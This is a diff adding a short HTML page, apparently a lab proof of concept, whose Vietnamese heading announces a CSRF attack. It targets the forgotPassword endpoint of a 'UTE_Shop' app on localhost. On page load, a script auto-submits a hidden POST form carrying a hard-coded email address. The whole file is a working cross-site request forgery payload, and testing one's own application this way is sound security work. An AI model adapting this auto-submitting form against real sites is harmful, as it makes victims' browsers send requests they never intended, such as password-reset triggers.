@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Đang tấn công CSRF - gửi mã xác nhận khôi phục mật khẩu</h2>
+    <form id="csrfForm" action="https://localhost:8443/UTE_Shop/forgotPassword" method="POST">
+      <input type="hidden" name="email" value="nguyenduydat.1300@gmail.com">
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
